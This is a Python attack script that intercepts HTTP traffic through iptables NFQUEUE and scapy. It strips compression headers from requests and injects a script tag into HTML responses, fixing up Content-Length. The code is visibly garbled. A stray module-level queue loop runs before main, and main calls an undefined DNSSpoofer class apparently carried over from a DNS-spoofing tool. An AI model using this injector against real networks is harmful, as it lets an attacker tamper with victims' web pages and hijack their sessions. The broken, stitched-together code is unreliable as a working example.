#!/usr/bin/env python3

import argparse
import subprocess
import re

import netfilterqueue
import kamene.all as scapy


def get_arguments():
    """
    Return the arguments:
    - traffic: Spoof traffic on the [local] machine or [remote] machine
    - domain: Which domain to spoof traffic for
    - queue: The queue number to capture packets for
    """

    # Create parser
    parser = argparse.ArgumentParser()
    parser.add_argument("traffic", choices=["local", "remote"], help="Capture traffic on local or remote machine")
    parser.add_argument("domain", help="Provide a domain to spoof and respond with")
    parser.add_argument("host", help="Host address to redirect user to")
    parser.add_argument("-q", "--queue-num", dest="queue", default=0, type=int,
                        help="Provide the queue number to capture packets for")

    # Parse args
    arguments = parser.parse_args()
    return arguments


def queue_local_traffic(queue_number):
    """Capture local traffic to the queue"""
    subprocess.run(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", str(queue_number)], check=True)
    subprocess.run(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", str(queue_number)], check=True)


def queue_remote_traffic(queue_number):
    """Capture remote traffic to the queue"""
    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", str(queue_number)], check=True)


def reset_ip_tables():
    """Reset IP tables"""
    subprocess.run(["iptables", "--flush"], check=True)

def set_load(packet, load):
    packet[scapy.Raw].load = load

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] HTTP Request")
            try:
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load.decode())
            except Exception as e:
                pass

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] HTTP Response")
            injection_code = "<script>alert('test');</script>"

            try:
                load = load.decode().replace("</body>", injection_code + "</body>")

                # Update the Content-Length header if it exists
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))
            except Exception as e:
                pass

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(new_packet))

    packet.accept()





queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


def main(args):
    traffic = args.traffic
    domain = args.domain
    host = args.host
    queue_number = args.queue

    queue = None
    try:
        if traffic == "local":
            queue_local_traffic(queue_number)
            print(f"[+] Capturing local traffic in Queue {queue_number}.")
        elif traffic == "remote":
            queue_remote_traffic(queue_number)
            print(f"[+] Capturing remote traffic in Queue {queue_number}.")

        # Initialize DNS Spoofer instance with variable content
        dns_spoofer = DNSSpoofer(domain, host)

        # Bind queue
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(queue_number, dns_spoofer.process_packet)

        print(f"[+] Successfully binded to Queue {queue_number}")
        queue.run()

    except KeyboardInterrupt:
        print("\n[-] Detected CTRL + C ..... Resetting IP tables ..... Please wait..")
    except Exception as e:
        print(f"[-] Exception caught: {str(e)} ..... Resetting IP tables ..... Please wait..")
    finally:
        if queue:
            queue.unbind()
        reset_ip_tables()


if __name__ == "__main__":
    args = get_arguments()
    main(args)
